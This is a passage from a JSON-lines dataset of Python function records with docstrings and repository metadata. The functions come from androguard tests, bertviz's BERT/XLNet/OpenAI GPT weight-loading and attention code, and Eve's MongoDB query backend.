\"foonbar\"]))\n\ncfield = next(dx.find_fields(fieldname='cfield'))\n# this one is static, hence it must have a write in <clinit>\nself.assertListEqual(list(sorted(map(lambda x: x.name, map(itemgetter(1),\n    cfield.get_xref_write(withoffset=True))))), sorted([\"<clinit>\"]))\nself.assertListEqual(list(sorted(map(lambda x: x.name, map(itemgetter(1),\n    cfield.get_xref_read(withoffset=True))))), sorted([\"foonbar\"]))", "path": "androguard/tests/test_analysis.py", "commit_date": "2020-10-24 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\"\nWrapper around nx.write_gml\n\"\"\"\n", "func_signal": "def _write_gml(G, path):\n", "code": "import networkx as nx\nreturn nx.write_gml(G, path, stringizer=str)", "path": "androguard/androguard/cli/main.py", "commit_date": "2020-11-21 00:00:00", "repo_name": "androguard/androguard", "stars": 4847, "license": "apache-2.0", "language": "python", "size": 100554}
{"docstring": "\"\"\" Load tf pre-trained weights in a pytorch model (from NumPy arrays here)\n\"\"\"\n", "func_signal": "def load_tf_weights_in_openai_gpt(model, config, openai_checkpoint_folder_path):\n", "code": "import re\nimport numpy as np\n\nif '.ckpt' in openai_checkpoint_folder_path:\n    openai_checkpoint_folder_path = os.path.dirname(openai_checkpoint_folder_path)\n\nlogger.info(\"Loading weights from {}\".format(openai_checkpoint_folder_path))\n\nnames = json.load(open(openai_checkpoint_folder_path + '/parameters_names.json', \"r\", encoding='utf-8'))\nshapes = json.load(open(openai_checkpoint_folder_path + '/params_shapes.json', \"r\", encoding='utf-8'))\noffsets = np.cumsum([np.prod(shape) for shape in shapes])\ninit_params = [np.load(openai_checkpoint_folder_path + '/params_{}.npy'.format(n)) for n in range(10)]\ninit_params = np.split(np.concatenate(init_params, 0), offsets)[:-1]\ninit_params = [param.reshape(shape) for param, shape in zip(init_params, shapes)]\n\n# This was used when we had a single embedding matrix for positions and tokens\n# init_params[0] = np.concatenate([init_params[1], init_params[0]], 0)\n# del init_params[1]\ninit_params = [arr.squeeze() for arr in init_params]\n\ntry:\n    assert model.tokens_embed.weight.shape == init_params[1].shape\n    assert model.positions_embed.weight.shape == init_params[0].shape\nexcept AssertionError as e:\n    e.args += (model.tokens_embed.weight.shape, init_params[1].shape)\n    e.args += (model.positions_embed.weight.shape, init_params[0].shape)\n    raise\n\nmodel.tokens_embed.weight.data = torch.from_numpy(init_params[1])\nmodel.positions_embed.weight.data = torch.from_numpy(init_params[0])\nnames.pop(0)\n# Pop position and token embedding arrays\ninit_params.pop(0)\ninit_params.pop(0)\n\nfor name, array in zip(names, init_params): # names[1:n_transfer], init_params[1:n_transfer]):\n    name = name[6:]  # skip \"model/\"\n    assert name[-2:] == \":0\"\n    name = name[:-2]\n    name = name.split('/')\n    pointer = model\n    for m_name in name:\n        if re.fullmatch(r'[A-Za-z]+\\d+', m_name):\n            l = re.split(r'(\\d+)', m_name)\n        else:\n            l = [m_name]\n        if l[0] == 'g':\n            pointer = getattr(pointer, 'weight')\n        elif l[0] == 'b':\n            pointer = getattr(pointer, 'bias')\n        elif l[0] == 'w':\n            pointer = getattr(pointer, 'weight')\n        else:\n            pointer = getattr(pointer, l[0])\n        if len(l) >= 2:\n            num = int(l[1])\n            pointer = pointer[num]\n    try:\n        assert pointer.shape == array.shape\n    except AssertionError as e:\n        e.args += (pointer.shape, array.shape)\n        raise\n    try:\n        assert pointer.shape == array.shape\n    except AssertionError as e:\n        e.args += (pointer.shape, array.shape)\n        raise\n    logger.info(\"Initialize PyTorch weight {}\".format(name))\n    pointer.data = torch.from_numpy(array)\nreturn model", "path": "bertviz/bertviz/transformers_neuron_view/modeling_openai.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "# We \"pool\" the model by simply taking the hidden state corresponding\n# to the first token.\n", "func_signal": "def forward(self, hidden_states):\n", "code": "first_token_tensor = hidden_states[:, 0]\npooled_output = self.dense(first_token_tensor)\npooled_output = self.activation(pooled_output)\nreturn pooled_output", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Prunes heads of the model.\n    heads_to_prune: dict of {layer_num: list of heads to prune in this layer}\n\"\"\"\n", "func_signal": "def _prune_heads(self, heads_to_prune):\n", "code": "for layer, heads in heads_to_prune.items():\n    self.h[layer].attn.prune_heads(heads)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_openai.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"perform relative shift to form the relative attention score.\"\"\"\n", "func_signal": "def rel_shift(x, klen=-1):\n", "code": "x_size = x.shape\n\nx = x.reshape(x_size[1], x_size[0], x_size[2], x_size[3])\nx = x[1:, ...]\nx = x.reshape(x_size[0], x_size[1] - 1, x_size[2], x_size[3])\n# x = x[:, 0:klen, :, :]\nx = torch.index_select(x, 1, torch.arange(klen, device=x.device, dtype=torch.long))\n\nreturn x", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"Core relative positional attention operations.\"\"\"\n\n# content based attention score\n", "func_signal": "def rel_attn_core(self, q_head, k_head_h, v_head_h, k_head_r, seg_mat=None, attn_mask=None, head_mask=None):\n", "code": "ac = torch.einsum('ibnd,jbnd->ijbn', q_head + self.r_w_bias, k_head_h)\n\n# position based attention score\nbd = torch.einsum('ibnd,jbnd->ijbn', q_head + self.r_r_bias, k_head_r)\nbd = self.rel_shift(bd, klen=ac.shape[1])\n\n# segment based attention score\nif seg_mat is None:\n    ef = 0\nelse:\n    ef = torch.einsum('ibnd,snd->ibns', q_head + self.r_s_bias, self.seg_embed)\n    ef = torch.einsum('ijbs,ibns->ijbn', seg_mat, ef)\n\n# merge attention scores and perform masking\nattn_score = (ac + bd + ef) * self.scale\nif attn_mask is not None:\n    # attn_score = attn_score * (1 - attn_mask) - 1e30 * attn_mask\n    attn_score = attn_score - 1e30 * attn_mask\n\n# attention probability\nattn_prob = F.softmax(attn_score, dim=1)\nattn_prob = self.dropout(attn_prob)\n\n# Mask heads if we want to\nif head_mask is not None:\n    attn_prob = attn_prob * head_mask\n\n# attention output\nattn_vec = torch.einsum('ijbn,jbnd->ibnd', attn_prob, v_head_h)\n\nif self.output_attentions:\n    return attn_vec, attn_prob\n\nreturn attn_vec", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" A map of modules from TF to PyTorch.\n    I use a map to keep the PyTorch model as\n    identical to the original PyTorch model as possible.\n\"\"\"\n\n", "func_signal": "def build_tf_xlnet_to_pytorch_map(model, config, tf_weights=None):\n", "code": "tf_to_pt_map = {}\n\nif hasattr(model, 'transformer'):\n    if hasattr(model, 'lm_loss'):\n        # We will load also the output bias\n        tf_to_pt_map['model/lm_loss/bias'] = model.lm_loss.bias\n    if hasattr(model, 'sequence_summary') and 'model/sequnece_summary/summary/kernel' in tf_weights:\n        # We will load also the sequence summary\n        tf_to_pt_map['model/sequnece_summary/summary/kernel'] = model.sequence_summary.summary.weight\n        tf_to_pt_map['model/sequnece_summary/summary/bias'] = model.sequence_summary.summary.bias\n    if hasattr(model, 'logits_proj') and config.finetuning_task is not None \\\n            and 'model/regression_{}/logit/kernel'.format(config.finetuning_task) in tf_weights:\n        tf_to_pt_map['model/regression_{}/logit/kernel'.format(config.finetuning_task)] = model.logits_proj.weight\n        tf_to_pt_map['model/regression_{}/logit/bias'.format(config.finetuning_task)] = model.logits_proj.bias\n\n    # Now load the rest of the transformer\n    model = model.transformer\n\n# Embeddings and output\ntf_to_pt_map.update({'model/transformer/word_embedding/lookup_table': model.word_embedding.weight,\n                     'model/transformer/mask_emb/mask_emb': model.mask_emb})\n\n# Transformer blocks\nfor i, b in enumerate(model.layer):\n    layer_str = \"model/transformer/layer_%d/\" % i\n    tf_to_pt_map.update({\n        layer_str + \"rel_attn/LayerNorm/gamma\": b.rel_attn.layer_norm.weight,\n        layer_str + \"rel_attn/LayerNorm/beta\": b.rel_attn.layer_norm.bias,\n        layer_str + \"rel_attn/o/kernel\": b.rel_attn.o,\n        layer_str + \"rel_attn/q/kernel\": b.rel_attn.q,\n        layer_str + \"rel_attn/k/kernel\": b.rel_attn.k,\n        layer_str + \"rel_attn/r/kernel\": b.rel_attn.r,\n        layer_str + \"rel_attn/v/kernel\": b.rel_attn.v,\n        layer_str + \"ff/LayerNorm/gamma\": b.ff.layer_norm.weight,\n        layer_str + \"ff/LayerNorm/beta\": b.ff.layer_norm.bias,\n        layer_str + \"ff/layer_1/kernel\": b.ff.layer_1.weight,\n        layer_str + \"ff/layer_1/bias\": b.ff.layer_1.bias,\n        layer_str + \"ff/layer_2/kernel\": b.ff.layer_2.weight,\n        layer_str + \"ff/layer_2/bias\": b.ff.layer_2.bias,\n    })\n\n# Relative positioning biases\nif config.untie_r:\n    r_r_list = []\n    r_w_list = []\n    r_s_list = []\n    seg_embed_list = []\n    for b in model.layer:\n        r_r_list.append(b.rel_attn.r_r_bias)\n        r_w_list.append(b.rel_attn.r_w_bias)\n        r_s_list.append(b.rel_attn.r_s_bias)\n        seg_embed_list.append(b.rel_attn.seg_embed)\nelse:\n    r_r_list = [model.r_r_bias]\n    r_w_list = [model.r_w_bias]\n    r_s_list = [model.r_s_bias]\n    seg_embed_list = [model.seg_embed]\ntf_to_pt_map.update({\n    'model/transformer/r_r_bias': r_r_list,\n    'model/transformer/r_w_bias': r_w_list,\n    'model/transformer/r_s_bias': r_s_list,\n    'model/transformer/seg_embed': seg_embed_list})\nreturn tf_to_pt_map", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.cls.predictions.decoder,\n                           self.bert.embeddings.word_embeddings)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Initialize the weights.\n\"\"\"\n", "func_signal": "def init_weights(self, module):\n", "code": "if isinstance(module, (nn.Linear, nn.Embedding)):\n    # Slightly different from the TF version which uses truncated_normal for initialization\n    # cf https://github.com/pytorch/pytorch/pull/5617\n    module.weight.data.normal_(mean=0.0, std=self.config.initializer_range)\n    if isinstance(module, nn.Linear) and module.bias is not None:\n        module.bias.data.zero_()\nelif isinstance(module, XLNetLayerNorm):\n    module.bias.data.zero_()\n    module.weight.data.fill_(1.0)\nelif isinstance(module, XLNetRelativeAttention):\n    for param in [module.q, module.k, module.v, module.o, module.r,\n                  module.r_r_bias, module.r_s_bias, module.r_w_bias,\n                  module.seg_embed]:\n        param.data.normal_(mean=0.0, std=self.config.initializer_range)\nelif isinstance(module, XLNetModel):\n        module.mask_emb.data.normal_(mean=0.0, std=self.config.initializer_range)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Prunes heads of the model.\n    heads_to_prune: dict of {layer_num: list of heads to prune in this layer}\n    See base class PreTrainedModel\n\"\"\"\n", "func_signal": "def _prune_heads(self, heads_to_prune):\n", "code": "for layer, heads in heads_to_prune.items():\n    self.encoder.layer[layer].attention.prune_heads(heads)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.cls.predictions.decoder,\n                           self.bert.embeddings.word_embeddings)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Load tf checkpoints in a pytorch model\n\"\"\"\n", "func_signal": "def load_tf_weights_in_xlnet(model, config, tf_path):\n", "code": "try:\n    import numpy as np\n    import tensorflow as tf\nexcept ImportError:\n    logger.error(\"Loading a TensorFlow models in PyTorch, requires TensorFlow to be installed. Please see \"\n        \"https://www.tensorflow.org/install/ for installation instructions.\")\n    raise\n# Load weights from TF model\ninit_vars = tf.train.list_variables(tf_path)\ntf_weights = {}\nfor name, shape in init_vars:\n    logger.info(\"Loading TF weight {} with shape {}\".format(name, shape))\n    array = tf.train.load_variable(tf_path, name)\n    tf_weights[name] = array\n\n# Build TF to PyTorch weights loading map\ntf_to_pt_map = build_tf_xlnet_to_pytorch_map(model, config, tf_weights)\n\nfor name, pointer in tf_to_pt_map.items():\n    logger.info(\"Importing {}\".format(name))\n    if name not in tf_weights:\n        logger.info(\"{} not in tf pre-trained weights, skipping\".format(name))\n        continue\n    array = tf_weights[name]\n    # adam_v and adam_m are variables used in AdamWeightDecayOptimizer to calculated m and v\n    # which are not required for using pretrained model\n    if 'kernel' in name and ('ff' in name or 'summary' in name or 'logit' in name):\n        logger.info(\"Transposing\")\n        array = np.transpose(array)\n    if isinstance(pointer, list):\n        # Here we will split the TF weigths\n        assert len(pointer) == array.shape[0]\n        for i, p_i in enumerate(pointer):\n            arr_i = array[i, ...]\n            try:\n                assert p_i.shape == arr_i.shape\n            except AssertionError as e:\n                e.args += (p_i.shape, arr_i.shape)\n                raise\n            logger.info(\"Initialize PyTorch weight {} for layer {}\".format(name, i))\n            p_i.data = torch.from_numpy(arr_i)\n    else:\n        try:\n            assert pointer.shape == array.shape\n        except AssertionError as e:\n            e.args += (pointer.shape, array.shape)\n            raise\n        logger.info(\"Initialize PyTorch weight {}\".format(name))\n        pointer.data = torch.from_numpy(array)\n    tf_weights.pop(name, None)\n    tf_weights.pop(name + '/Adam', None)\n    tf_weights.pop(name + '/Adam_1', None)\n\nlogger.info(\"Weights not copied to PyTorch model: {}\".format(', '.join(tf_weights.keys())))\nreturn model", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Initialize the weights.\n\"\"\"\n", "func_signal": "def init_weights(self, module):\n", "code": "if isinstance(module, (nn.Linear, nn.Embedding)):\n    # Slightly different from the TF version which uses truncated_normal for initialization\n    # cf https://github.com/pytorch/pytorch/pull/5617\n    module.weight.data.normal_(mean=0.0, std=self.config.initializer_range)\nelif isinstance(module, BertLayerNorm):\n    module.bias.data.zero_()\n    module.weight.data.fill_(1.0)\nif isinstance(module, nn.Linear) and module.bias is not None:\n    module.bias.data.zero_()", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"Construct a layernorm module in the TF style (epsilon inside the square root).\n\"\"\"\n", "func_signal": "def __init__(self, d_model, eps=1e-12):\n", "code": "super(XLNetLayerNorm, self).__init__()\nself.weight = nn.Parameter(torch.ones(d_model))\nself.bias = nn.Parameter(torch.zeros(d_model))\nself.variance_epsilon = eps", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"Post-attention processing.\"\"\"\n# post-attention projection (back to `d_model`)\n", "func_signal": "def post_attention(self, h, attn_vec, residual=True):\n", "code": "attn_out = torch.einsum('ibnd,hnd->ibh', attn_vec, self.o)\n\nattn_out = self.dropout(attn_out)\nif residual:\n    attn_out = attn_out + h\noutput = self.layer_norm(attn_out)\n\nreturn output", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Load tf checkpoints in a pytorch model.\n\"\"\"\n", "func_signal": "def load_tf_weights_in_bert(model, config, tf_checkpoint_path):\n", "code": "try:\n    import re\n    import numpy as np\n    import tensorflow as tf\nexcept ImportError:\n    logger.error(\"Loading a TensorFlow model in PyTorch, requires TensorFlow to be installed. Please see \"\n        \"https://www.tensorflow.org/install/ for installation instructions.\")\n    raise\ntf_path = os.path.abspath(tf_checkpoint_path)\nlogger.info(\"Converting TensorFlow checkpoint from {}\".format(tf_path))\n# Load weights from TF model\ninit_vars = tf.train.list_variables(tf_path)\nnames = []\narrays = []\nfor name, shape in init_vars:\n    logger.info(\"Loading TF weight {} with shape {}\".format(name, shape))\n    array = tf.train.load_variable(tf_path, name)\n    names.append(name)\n    arrays.append(array)\n\nfor name, array in zip(names, arrays):\n    name = name.split('/')\n    # adam_v and adam_m are variables used in AdamWeightDecayOptimizer to calculated m and v\n    # which are not required for using pretrained model\n    if any(n in [\"adam_v\", \"adam_m\", \"global_step\"] for n in name):\n        logger.info(\"Skipping {}\".format(\"/\".join(name)))\n        continue\n    pointer = model\n    for m_name in name:\n        if re.fullmatch(r'[A-Za-z]+_\\d+', m_name):\n            l = re.split(r'_(\\d+)', m_name)\n        else:\n            l = [m_name]\n        if l[0] == 'kernel' or l[0] == 'gamma':\n            pointer = getattr(pointer, 'weight')\n        elif l[0] == 'output_bias' or l[0] == 'beta':\n            pointer = getattr(pointer, 'bias')\n        elif l[0] == 'output_weights':\n            pointer = getattr(pointer, 'weight')\n        elif l[0] == 'squad':\n            pointer = getattr(pointer, 'classifier')\n        else:\n            try:\n                pointer = getattr(pointer, l[0])\n            except AttributeError:\n                logger.info(\"Skipping {}\".format(\"/\".join(name)))\n                continue\n        if len(l) >= 2:\n            num = int(l[1])\n            pointer = pointer[num]\n    if m_name[-11:] == '_embeddings':\n        pointer = getattr(pointer, 'weight')\n    elif m_name == 'kernel':\n        array = np.transpose(array)\n    try:\n        assert pointer.shape == array.shape\n    except AssertionError as e:\n        e.args += (pointer.shape, array.shape)\n        raise\n    logger.info(\"Initialize PyTorch weight {}\".format(name))\n    pointer.data = torch.from_numpy(array)\nreturn model", "path": "bertviz/bertviz/transformers_neuron_view/modeling_bert.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.lm_head,\n                           self.transformer.tokens_embed)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_openai.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"cache hidden states into memory.\"\"\"\n", "func_signal": "def cache_mem(self, curr_out, prev_mem):\n", "code": "if self.mem_len is None or self.mem_len == 0:\n    return None\nelse:\n    if self.reuse_len is not None and self.reuse_len > 0:\n        curr_out = curr_out[:self.reuse_len]\n\n    if prev_mem is None:\n        new_mem = curr_out[-self.mem_len:]\n    else:\n        new_mem = torch.cat([prev_mem, curr_out], dim=0)[-self.mem_len:]\n\nreturn new_mem.detach()", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Implementation of the gelu activation function.\n    XLNet is using OpenAI GPT's gelu (not exactly the same as BERT)\n    Also see https://arxiv.org/abs/1606.08415\n\"\"\"\n", "func_signal": "def gelu(x):\n", "code": "cdf = 0.5 * (1.0 + torch.tanh(math.sqrt(2 / math.pi) * (x + 0.044715 * torch.pow(x, 3))))\nreturn x * cdf", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\" Make sure we are sharing the input and output embeddings.\n    Export to TorchScript can't handle parameter sharing so we are cloning them instead.\n\"\"\"\n", "func_signal": "def tie_weights(self):\n", "code": "self._tie_or_clone_weights(self.lm_head,\n                           self.transformer.tokens_embed)", "path": "bertviz/bertviz/transformers_neuron_view/modeling_openai.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"\nCreates causal attention mask. Float mask where 1.0 indicates masked, 0.0 indicates not-masked.\n\nArgs:\n    qlen: TODO Lysandre didn't fill\n    mlen: TODO Lysandre didn't fill\n\n::\n\n          same_length=False:      same_length=True:\n          <mlen > <  qlen >       <mlen > <  qlen >\n       ^ [0 0 0 0 0 1 1 1 1]     [0 0 0 0 0 1 1 1 1]\n         [0 0 0 0 0 0 1 1 1]     [1 0 0 0 0 0 1 1 1]\n    qlen [0 0 0 0 0 0 0 1 1]     [1 1 0 0 0 0 0 1 1]\n         [0 0 0 0 0 0 0 0 1]     [1 1 1 0 0 0 0 0 1]\n       v [0 0 0 0 0 0 0 0 0]     [1 1 1 1 0 0 0 0 0]\n\n\"\"\"\n", "func_signal": "def create_mask(self, qlen, mlen):\n", "code": "attn_mask = torch.ones([qlen, qlen])\nmask_up = torch.triu(attn_mask, diagonal=1)\nattn_mask_pad = torch.zeros([qlen, mlen])\nret = torch.cat([attn_mask_pad, mask_up], dim=1)\nif self.same_length:\n    mask_lo = torch.tril(attn_mask, diagonal=-1)\n    ret = torch.cat([ret[:, :qlen] + mask_lo, ret[:, qlen:]], dim=1)\n\nret = ret.to(next(self.parameters()))\nreturn ret", "path": "bertviz/bertviz/transformers_neuron_view/modeling_xlnet.py", "commit_date": "2019-11-24 00:00:00", "repo_name": "jessevig/bertviz", "stars": 6204, "license": "apache-2.0", "language": "python", "size": 203130}
{"docstring": "\"\"\"Takes two db queries and applies db-specific syntax to produce\nthe intersection.\n\nThis is used because we can't just dump one set of query operators\ninto another.\n\nConsider for example if the dataset contains a custom datasource\npattern like --\n   'filter': {'username': {'$exists': True}}\n\nIf we simultaneously try to filter on the field `username`,\nthen doing\n    query_a.update(query_b)\nwould lose information.\n\nThis implementation of the function just combines everything in the\ntwo dicts using the `$and` operator.\n\nNote that this is exactly same as performing dict.update() except\nwhen multiple operators are operating on the /same field/.\n\nExample:\n    combine_queries({'username': {'$exists': True}},\n                    {'username': 'mike'})\n{'$and': [{'username': {'$exists': True}}, {'username': 'mike'}]}\n\n.. versionadded: 0.1.0\n   Support for intelligent combination of db queries\n\"\"\"\n# Chain the operations with the $and operator\n", "func_signal": "def combine_queries(self, query_a, query_b):\n", "code": "return {\n    \"$and\": [\n        {k: v} for k, v in itertools.chain(query_a.items(), query_b.items())\n    ]\n}", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Retrieves a set of documents matching a given request. Queries can\nbe expressed in two different formats: the mongo query syntax, and the\npython syntax. The first kind of query would look like: ::\n\n    ?where={\"name\": \"john doe\"}\n\nwhile the second would look like: ::\n\n    ?where=name==\"john doe\"\n\nThe resultset if paginated.\n\n:param resource: resource name.\n:param req: a :class:`ParsedRequest`instance.\n:param sub_resource_lookup: sub-resource lookup from the endpoint url.\n\n.. versionchanged:: 0.6\n   Support for multiple databases.\n   Filter soft deleted documents by default\n\n.. versionchanged:: 0.5\n   Support for comma delimited sort syntax. Addresses #443.\n   Return the error if a blacklisted MongoDB operator is used in query.\n   Abort with 400 if unsupported query operator is used. #387.\n   Abort with 400 in case of invalid sort syntax. #387.\n\n.. versionchanged:: 0.4\n   'allowed_filters' is now checked before adding 'sub_resource_lookup'\n   to the query, as it is considered safe.\n   Refactored to use self._client_projection since projection is now\n   honored by getitem() as well.\n\n.. versionchanged:: 0.3\n   Support for new _mongotize() signature.\n\n.. versionchanged:: 0.2\n   Support for sub-resources.\n   Support for 'default_sort'.\n\n.. versionchanged:: 0.1.1\n   Better query handling. We're now properly casting objectid-like\n   strings to ObjectIds. Also, we're casting both datetimes and\n   objectids even when the query was originally in python syntax.\n\n.. versionchanged:: 0.0.9\n   More informative error messages.\n\n.. versionchanged:: 0.0.7\n   Abort with a 400 if the query includes blacklisted  operators.\n\n.. versionchanged:: 0.0.6\n   Only retrieve fields in the resource schema\n   Support for projection queries ('?projection={\"name\": 1}')\n\n.. versionchanged:: 0.0.5\n   handles the case where req.max_results is None because pagination\n   has been disabled.\n\n.. versionchanged:: 0.0.4\n   retrieves the target collection via the new config.SOURCES helper.\n\"\"\"\n", "func_signal": "def find(self, resource, req, sub_resource_lookup, perform_count=True):\n", "code": "args = dict()\n\nif req and req.max_results:\n    args[\"limit\"] = req.max_results\n\nif req and req.page > 1:\n    args[\"skip\"] = (req.page - 1) * req.max_results\n\n# TODO sort syntax should probably be coherent with 'where': either\n# mongo-like # or python-like. Currently accepts only mongo-like sort\n# syntax.\n\n# TODO should validate on unknown sort fields (mongo driver doesn't\n# return an error)\n\nclient_sort = self._convert_sort_request_to_dict(req)\nspec = self._convert_where_request_to_dict(resource, req)\n\nbad_filter = validate_filters(spec, resource)\nif bad_filter:\n    abort(400, bad_filter)\n\nif sub_resource_lookup:\n    spec = self.combine_queries(spec, sub_resource_lookup)\n\nif (\n    config.DOMAIN[resource][\"soft_delete\"]\n    and not (req and req.show_deleted)\n    and not self.query_contains_field(spec, config.DELETED)\n):\n    # Soft delete filtering applied after validate_filters call as\n    # querying against the DELETED field must always be allowed when\n    # soft_delete is enabled\n    spec = self.combine_queries(spec, {config.DELETED: {\"$ne\": True}})\n\nspec = self._mongotize(spec, resource)\n\nclient_projection = self._client_projection(req)\n\ndatasource, spec, projection, sort = self._datasource_ex(\n    resource, spec, client_projection, client_sort\n)\n\nif req and req.if_modified_since:\n    spec[config.LAST_UPDATED] = {\"$gt\": req.if_modified_since}\n\nif len(spec) > 0:\n    args[\"filter\"] = spec\n\nif sort is not None:\n    args[\"sort\"] = sort\n\nif projection:\n    args[\"projection\"] = projection\n\ntarget = self.pymongo(resource).db[datasource]\ntry:\n    result = target.find(**args)\nexcept TypeError as e:\n    # pymongo raises ValueError when invalid query paramenters are\n    # included. We do our best to catch them beforehand but, especially\n    # with key/value sort syntax, invalid ones might still slip in.\n    self.app.logger.exception(e)\n    abort(400, description=debug_error_message(str(e)))\n\nif perform_count:\n    try:\n        count = target.count_documents(spec)\n    except:\n        # fallback to deprecated method. this might happen when the query\n        # includes operators not supported by count_documents(). one\n        # documented use-case is when we're running on mongo 3.4 and below,\n        # which does not support $expr ($expr must replace $where # in\n        # count_documents()).\n\n        # 1. Mongo 3.6+; $expr: pass\n        # 2. Mongo 3.6+; $where: pass (via fallback)\n        # 3. Mongo 3.4; $where: pass (via fallback)\n        # 4. Mongo 3.4; $expr: fail (operator not supported by db)\n\n        # See: http://api.mongodb.com/python/current/api/pymongo/collection.html#pymongo.collection.Collection.count\n        count = target.count()\nelse:\n    count = None\n\nreturn result, count", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
{"docstring": "\"\"\"Returns True if resource is empty; False otherwise. If there is\nno predefined filter on the resource we're relying on the\ndb.collection.count_documents. However, if we do have a predefined\nfilter we have to fallback on the find() method, which can be much\nslower.\n\n.. versionchanged:: 0.6\n   Support for multiple databases.\n\n.. versionadded:: 0.3\n\"\"\"\n", "func_signal": "def is_empty(self, resource):\n", "code": "datasource, filter_, _, _ = self.datasource(resource)\ncoll = self.pymongo(resource).db[datasource]\ntry:\n    if not filter_:\n        # faster, but we can only afford it if there's now predefined\n        # filter on the datasource.\n        return coll.count_documents({}) == 0\n    else:\n        # fallback on find() since we have a filter to apply.\n        try:\n            # need to check if the whole resultset is missing, no\n            # matter the IMS header.\n            del filter_[config.LAST_UPDATED]\n        except:\n            pass\n        return coll.count_documents(filter_) == 0\nexcept pymongo.errors.OperationFailure as e:\n    # see comment in :func:`insert()`.\n    self.app.logger.exception(e)\n    abort(\n        500,\n        description=debug_error_message(\n            \"pymongo.errors.OperationFailure: %s\" % e\n        ),\n    )", "path": "eve/eve/io/mongo/mongo.py", "commit_date": "2020-10-06 00:00:00", "repo_name": "pyeve/eve", "stars": 6654, "license": "other", "language": "python", "size": 19340}
